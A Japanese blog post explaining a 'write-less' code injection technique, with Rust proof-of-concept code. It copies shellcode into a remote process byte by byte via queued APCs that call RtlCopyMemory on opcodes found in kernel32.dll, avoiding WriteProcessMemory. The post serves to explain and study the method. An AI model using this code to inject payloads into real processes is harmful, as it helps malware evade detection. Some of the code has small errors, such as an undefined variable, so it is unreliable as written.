+++
title = "Write系コールを使わずにリモートプロセスにメモリをコピーする"
template = "page.html"
date = 2021-04-28T13:00:00Z
slug = "writeless-copy-memory"
[extra]
summary = " "
+++

### 概要

マルウェアのインジェクションについて調べていたら、面白い記事を発見しました。

> [Inject Me x64 Injection-less Code Injection](https://www.deepinstinct.com/2019/07/24/inject-me-x64-injection-less-code-injection/)

インジェクションレスなインジェクション？ は？

冗談はさておき、従来のアプローチである`WriteProcessMemory`や`NtMapViewOfSection`などを使用せずに、リモートプロセスにメモリをコピーすることが出来るようです。

記事中では複雑な手順と書かれていましたが、読んでみるとそこまで大した複雑さではありませんでした。

簡単に手順をまとめると次のようになります。

1. Sleep関数を呼ぶリモートスレッドを一時停止状態で作成する
2. `RtlCopyMemory`の関数ポインタを見つける
3. `NtQueueApcThreadEx`のAPCルーチンに`RtlCopyMemory`を指定し、3つのパラメータを埋める
4. `WaitForSingleObjectEx`または類似の関数をコールして、スレッドのアラートをトリガーする

さて、これを見ると一見簡単そうに見えますが、お気づきになりましたでしょうか。

3の手順の`RtlCopyMemory`で、`src`はどうするの？という話です。

`RtlCopyMemory`はリモートプロセスでコールされるため、`src`に渡す仮想アドレスはリモートプロセス内の仮想アドレスを指すことになります。

例えば自分のプロセス内にあるシェルコードのバッファーをコピーしたい時、これをどのように渡すのでしょうか？

これの解決策は、システムDLLのロード仕様を悪用する、が答えです。

`kernel32.dll`や`ntdll.dll`は、全てのプロセスで同じ仮想アドレスの場所に配置される仕様があります。

これを利用し、システムDLLのバッファー内にあるOPコードを1バイトずつコピーすることが出来ます。

`NtQueueApcThreadEx`を呼び出す回数 = APCキューの数 = コピーしたいメモリの長さ になります。

### PoCコード

```rust
unsafe fn queueing<F: Fn(HANDLE) -> Result<()>>(hp: HANDLE, sleep: PVOID, closure: F) -> Result<()> {
    // スレッドを一時停止状態のフラグ付きで作成
    // Sleep関数を開始ルーチンに設定し、1msだけSleepするようにパラメータを渡す
    let h_thread = CreateRemoteThread(
        hp,
        null_mut(),
        0,
        std::mem::transmute(sleep),
        1u32 as _,
        0x4,
        NULL as _,
    );

    if h_thread.is_null() {
        bail!("CreateRemoteThread failed.");
    } else {
        println!("created thread. thread_id {}", thread_id);
    };

    // コピー処理クロージャ
    closure(h_thread)?;

    // スレッドの一時停止状態を解除
    ResumeThread(h_thread);

    // スレッドのアラートをトリガーすることで、APCキューが一つずつ処理されていく
    WaitForSingleObjectEx(h_thread, 0xFFFFFFFF, true as _);

    Ok(())
}

unsafe fn copy_by_apc(h_thread: HANDLE, RtlCopyMemory: PVOID, src: PVOID, dst: PVOID, size: usize) {
    // RtlCopyMemoryをAPCルーチンに設定
    // コピー先とコピー元の引数を間違えないように注意
    NtQueueApcThreadEx(h_thread, null_mut(), transmute(RtlCopyMemory), dst, src, size as _);
}

// OPコードはu8、つまり0x00~0xFFであることは事前にわかっているため、
// 同じOPコードを何度も探しに行かなくて済むように探索結果をキャッシュ出来る
use std::lazy::OnceCell;
static mut CACHE: OnceCell<[*mut c_void; 0xFF]> = OnceCell::new();
 
unsafe fn get_op_by_module(module: PVOID, op: u8) -> Result<*mut c_void> {
    // CACHEが初期化されてない場合、初期化
    // これを呼ばずに先に初期化できるといいんですけど...
    let _ = CACHE.get_or_init(|| {
        zeroed::<[*mut c_void; 0xFF]>()
    });

    let cache = CACHE.get_mut().unwrap();

    if cache[op as usize].is_null() {
        let nt_header = (module as u64
            + (*(module as *mut IMAGE_DOS_HEADER)).e_lfanew as u64)
            as *mut IMAGE_NT_HEADERS64;

        for i in 0 .. (*nt_header).OptionalHeader.SizeOfImage {
            if *((module as u64 + i as u64) as *mut u8) == op {
                let op_addr = (module as u64 + i as u64) as *mut c_void;

                // ここでCACHEに結果を保存
                cache[op as usize] = op_addr;
                return Ok(op_addr);
            }
        }
    } else {
        // CACHEに結果が既にある場合はそのアドレスを使用する
        return Ok(cache[op as usize]);
    }

    bail!("not found op in module")
}
```

#### 使用例

一部疑似コードのため、そのままでは動きません。

```rust
// 使用例
unsafe fn main() -> Result<()> {
    let dst: Vec<u8> = get_binary_from_somewhere... ;
    let kernel32 = load_library...("kernel32.dll\x00");
    let sleep = get_function...(kernel32, "Sleep\x00");
    let rtl_copy_memory= get_function...(kernel32, "RtlCopyMemory\x00");
 
    let hp = OpenProcess... ;
    let allocated = VirtualAllocEx... ;
 
    queueing(hp, sleep, |ht| {
        for (i, op) in dst.iter().enumerate() {
            let op_addr = get_op_by_module(kernel32, *op)?;
            copy_by_apc(ht, rtl_copy_memory, op_addr, (allocated as u64 + i as u64) as _, 1);
        }
        Ok(())
    })?;
 
    Ok(())
}
```

これで、従来のようなメモリコピー手順をしなくてもリモートプロセスにメモリをコピー出来ます。

参考: [Inject Me x64 Injection-less Code Injection](https://www.deepinstinct.com/2019/07/24/inject-me-x64-injection-less-code-injection/)
